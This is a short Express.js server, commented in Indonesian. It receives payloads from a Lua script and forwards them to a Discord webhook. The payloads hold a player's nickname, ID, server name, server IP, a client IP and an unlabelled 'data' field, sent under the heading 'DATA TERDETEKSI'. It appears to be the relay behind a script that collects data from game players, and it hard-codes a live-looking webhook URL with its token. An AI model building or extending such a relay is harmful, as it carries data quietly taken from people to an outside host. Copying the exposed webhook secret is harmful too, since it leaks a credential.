import express from 'express'
import axios from 'axios'

const app = express()
app.use(express.json())

// Tentukan port 8080
const PORT = 8080

app.get('/', (_req, res) => {
  res.send('Hello Express API is running!')
})

// Endpoint disesuaikan dengan apiPath di script Lua ("/api/send")
app.post('/api/send', async (req, res) => {
  try {
    // Menangkap struktur payload cjson dari script Lua
    const { c, n, i, s, sip, mip, t } = req.body
    
    // Validasi sederhana jika payload kosong
    if (!c || !n) {
      return res.status(400).json({ success: false, error: "Invalid data format" })
    }

    // Merakit pesan agar rapi saat dibaca di Discord
    const discordMessage = 
      `**DATA TERDETEKSI**\n` +
      `\`\`\`\n` +
      `SERVER : ${s || 'Unknown'}\n` +
      `IP     : ${sip || 'Unknown'}\n` +
      `NICK   : ${n} (ID: ${i})\n` +
      `DATA   : ${c}\n` +
      `\`\`\``;
    
    // Masukkan URL Webhook Discord Anda di sini
    const webhookUrl = 'https://discord.com/api/webhooks/1541819771002036256/ISvR0KaiPnJOBX5w76JU3tlOg8orzy1fLRbzy6CC4-SYIPWoYObKIUaJkpvCZDXnsNJt'

    await axios.post(webhookUrl, {
      content: discordMessage
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    })
    
    res.json({ success: true })
  } catch (error) {
    console.error("Gagal mengirim ke Discord:", error)
    res.status(500).json({ success: false, error: "Internal Server Error" })
  }
})

// Tambahkan app.listen agar aplikasi Express aktif di port 8080
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`)
})

export default app
